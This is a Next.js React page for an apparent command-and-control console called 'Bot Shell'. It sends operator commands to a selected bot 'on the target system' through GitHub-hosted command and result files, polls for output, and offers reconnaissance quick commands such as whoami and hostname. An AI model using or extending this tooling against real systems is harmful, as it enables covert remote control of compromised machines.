'use client';

import { useState, useEffect } from 'react';
import { useRouter, useParams } from 'next/navigation';
import PageLayout from '../../components/PageLayout';
import LoadingScreen from '../../components/LoadingScreen';
import { User, parseUserFromCookie, removeCookie } from '../../utils/auth';

interface BotInfo {
  uuid: string;
  platform: string;
  transport_channel: string;
  status: string;
  created_at: string;
  commands_file: string;
  results_file: string;
  github_username?: string;
  github_repo?: string;
  last_seen?: string;
}

export default function ShellPage() {
  const [user, setUser] = useState<User | null>(null);
  const [loading, setLoading] = useState(true);
  const [botInfo, setBotInfo] = useState<BotInfo | null>(null);
  const [command, setCommand] = useState('');
  const [results, setResults] = useState<string[]>([]);
  const [isExecuting, setIsExecuting] = useState(false);
  const [isPolling, setIsPolling] = useState(false);
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null);
  const router = useRouter();
  const params = useParams();
  const botUuid = params.uuid as string;

  useEffect(() => {
    // Check if user is logged in via cookies
    const userInfo = parseUserFromCookie();
    if (!userInfo) {
      router.push('/');
      return;
    }

    setUser(userInfo);
    setLoading(false);
  }, [router]);

  // Load bot information
  useEffect(() => {
    if (user && botUuid) {
      loadBotInfo();
    }
  }, [user, botUuid]);

  // Cleanup polling on unmount
  useEffect(() => {
    return () => {
      if (pollingInterval) {
        clearInterval(pollingInterval);
      }
    };
  }, [pollingInterval]);

  const loadBotInfo = async () => {
    try {
      const response = await fetch(`http://localhost:5000/bots?username=${user?.username || 'admin'}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
        },
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          const bot = result.bots.find((b: BotInfo) => b.uuid === botUuid);
          if (bot) {
            setBotInfo(bot);
          } else {
            alert('Bot not found');
            router.push('/agentsandfleet');
          }
        }
      }
    } catch (error) {
      console.error('Error loading bot info:', error);
    }
  };

  const executeCommand = async () => {
    if (!command.trim() || !botInfo) return;

    setIsExecuting(true);
    setResults(prev => [...prev, `$ ${command}`]);

    try {
      const response = await fetch('http://localhost:5000/execute-command', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          bot_uuid: botUuid,
          command: command,
          username: user?.username || 'admin'
        }),
      });

      if (response.ok) {
        const result = await response.json();
        if (result.status === 'success') {
          setResults(prev => [...prev, `Command sent to bot ${botUuid}`]);
          
          // Start polling for results
          startPollingForResults();
        } else {
          setResults(prev => [...prev, `Error: ${result.message}`]);
        }
      } else {
        setResults(prev => [...prev, 'Error: Failed to send command']);
      }
    } catch (error) {
      console.error('Error executing command:', error);
      setResults(prev => [...prev, 'Error: Network error']);
    } finally {
      setIsExecuting(false);
      setCommand('');
    }
  };

  const startPollingForResults = () => {
    // Clear any existing polling
    if (pollingInterval) {
      clearInterval(pollingInterval);
    }

    setIsPolling(true);
    setResults(prev => [...prev, 'Starting to poll for results...']);

    // Start new polling every 2 seconds
    const interval = setInterval(async () => {
      try {
        const response = await fetch(`http://localhost:5000/get-results?bot_uuid=${botUuid}&username=${user?.username || 'admin'}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
          },
        });

                 if (response.ok) {
           const result = await response.json();
           if (result.status === 'success') {
             if (result.results) {
               // We got fresh results! Display them and stop polling
               setResults(prev => [...prev, result.results]);
               clearInterval(interval);
               setPollingInterval(null);
               setIsPolling(false);
               setResults(prev => [...prev, '✅ Results received successfully!']);
             } else {
               // No results yet, continue polling
               setResults(prev => {
                 // Update the last line to show polling status
                 const newResults = [...prev];
                 if (newResults.length > 0 && newResults[newResults.length - 1].includes('⏳ Polling for results')) {
                   newResults[newResults.length - 1] = `⏳ Polling for results... (${new Date().toLocaleTimeString()})`;
                 } else {
                   newResults.push(`⏳ Polling for results... (${new Date().toLocaleTimeString()})`);
                 }
                 return newResults;
               });
             }
           }
         }
      } catch (error) {
        console.error('Error polling for results:', error);
        setResults(prev => [...prev, `❌ Error polling for results: ${error}`]);
      }
    }, 2000);

    setPollingInterval(interval);
  };

  const stopPolling = () => {
    if (pollingInterval) {
      clearInterval(pollingInterval);
      setPollingInterval(null);
      setIsPolling(false);
      setResults(prev => [...prev, '🛑 Polling stopped manually']);
    }
  };

  const handleLogout = () => {
    removeCookie('user');
    router.push('/');
  };

  const clearResults = () => {
    setResults([]);
  };

  const handleKeyPress = (e: React.KeyboardEvent) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      executeCommand();
    }
  };

  if (loading) {
    return <LoadingScreen message="Loading Shell..." />;
  }

  if (!user || !botInfo) {
    return null;
  }

  return (
    <PageLayout user={user} currentPage="shell" onLogout={handleLogout}>
      {/* Main Content Area */}
      <main className="flex-1 p-6 bg-gray-950 overflow-auto">
        {/* Page Header */}
        <div className="flex items-center justify-between mb-6">
          <div>
            <h1 className="text-3xl font-mono font-bold text-green-400">Bot Shell</h1>
            <div className="text-gray-400 font-mono text-sm mt-1">
              Connected to: {botUuid} ({botInfo.platform})
            </div>
          </div>
          
          {/* Bot Status */}
          <div className="flex items-center space-x-4">
            <div className="text-right">
              <div className="text-gray-400 font-mono text-sm">Status</div>
              <div className={`font-mono text-sm font-semibold ${
                botInfo.status === 'active' ? 'text-green-400' : 'text-red-400'
              }`}>
                {botInfo.status.toUpperCase()}
              </div>
            </div>
            <div className="text-right">
              <div className="text-gray-400 font-mono text-sm">Transport</div>
              <div className="text-white font-mono text-sm">{botInfo.transport_channel}</div>
            </div>
            <button
              onClick={() => router.push('/agentsandfleet')}
              className="bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg font-mono text-sm transition-colors"
            >
              ← Back to Fleet
            </button>
          </div>
        </div>

        {/* Shell Interface */}
        <div className="bg-gray-900 rounded-lg border border-gray-700 overflow-hidden">
          {/* Terminal Header */}
          <div className="bg-gray-800 px-4 py-2 border-b border-gray-700">
            <div className="flex items-center space-x-2">
              <div className="w-3 h-3 rounded-full bg-red-500"></div>
              <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
              <div className="w-3 h-3 rounded-full bg-green-500"></div>
              <span className="text-gray-400 font-mono text-sm ml-2">Bot Shell - {botUuid}</span>
            </div>
          </div>

          {/* Terminal Output */}
          <div className="p-4 h-96 overflow-y-auto bg-black">
            <div className="font-mono text-sm text-green-400 space-y-1">
              {results.length === 0 ? (
                <div className="text-gray-500">
                  Welcome to Bot Shell. Type a command to execute on the target system.
                </div>
              ) : (
                results.map((result, index) => (
                  <div key={index} className="whitespace-pre-wrap">
                    {result}
                  </div>
                ))
              )}
                             {isExecuting && (
                 <div className="text-yellow-400">
                   Executing command...
                 </div>
               )}
               {isPolling && (
                 <div className="text-blue-400">
                   ⏳ Polling for results...
                 </div>
               )}
            </div>
          </div>

          {/* Command Input */}
          <div className="bg-gray-800 p-4 border-t border-gray-700">
            <div className="flex items-center space-x-3">
              <span className="text-green-400 font-mono text-sm">$</span>
              <input
                type="text"
                value={command}
                onChange={(e) => setCommand(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Enter command to execute..."
                disabled={isExecuting}
                className="flex-1 bg-transparent text-white font-mono text-sm focus:outline-none placeholder-gray-500"
              />
              <button
                onClick={executeCommand}
                disabled={isExecuting || !command.trim()}
                className={`px-4 py-2 rounded font-mono text-sm transition-colors ${
                  isExecuting || !command.trim()
                    ? 'bg-gray-700 text-gray-500 cursor-not-allowed'
                    : 'bg-green-600 hover:bg-green-700 text-white'
                }`}
              >
                {isExecuting ? 'Executing...' : 'Execute'}
              </button>
                             <button
                 onClick={clearResults}
                 className="bg-gray-600 hover:bg-gray-500 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
               >
                 Clear
               </button>
               {isPolling && (
                 <button
                   onClick={stopPolling}
                   className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded font-mono text-sm transition-colors"
                 >
                   Stop Polling
                 </button>
               )}
            </div>
          </div>
        </div>

        {/* Bot Information */}
        <div className="mt-6 grid grid-cols-1 md:grid-cols-3 gap-4">
          <div className="bg-gray-900 rounded-lg p-4 border border-gray-700">
            <h3 className="text-lg font-mono font-semibold text-blue-400 mb-2">Bot Details</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-400">UUID:</span>
                <span className="text-white font-mono">{botInfo.uuid}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Platform:</span>
                <span className="text-white capitalize">{botInfo.platform}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Created:</span>
                <span className="text-white">{new Date(botInfo.created_at).toLocaleString()}</span>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 rounded-lg p-4 border border-gray-700">
            <h3 className="text-lg font-mono font-semibold text-blue-400 mb-2">GitHub Files</h3>
            <div className="space-y-2 text-sm">
              <div className="flex justify-between">
                <span className="text-gray-400">Commands:</span>
                <span className="text-white font-mono text-xs">{botInfo.commands_file}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Results:</span>
                <span className="text-white font-mono text-xs">{botInfo.results_file}</span>
              </div>
              <div className="flex justify-between">
                <span className="text-gray-400">Repo:</span>
                <span className="text-white font-mono text-xs">{botInfo.github_repo}</span>
              </div>
            </div>
          </div>

          <div className="bg-gray-900 rounded-lg p-4 border border-gray-700">
            <h3 className="text-lg font-mono font-semibold text-blue-400 mb-2">Quick Commands</h3>
            <div className="space-y-2">
              <button
                onClick={() => setCommand('whoami')}
                className="w-full text-left text-sm text-gray-300 hover:text-white font-mono p-2 rounded bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                whoami
              </button>
              <button
                onClick={() => setCommand('hostname')}
                className="w-full text-left text-sm text-gray-300 hover:text-white font-mono p-2 rounded bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                hostname
              </button>
              <button
                onClick={() => setCommand('pwd')}
                className="w-full text-left text-sm text-gray-300 hover:text-white font-mono p-2 rounded bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                pwd
              </button>
              <button
                onClick={() => setCommand('ls -la')}
                className="w-full text-left text-sm text-gray-300 hover:text-white font-mono p-2 rounded bg-gray-800 hover:bg-gray-700 transition-colors"
              >
                ls -la
              </button>
            </div>
          </div>
        </div>
      </main>
    </PageLayout>
  );
}
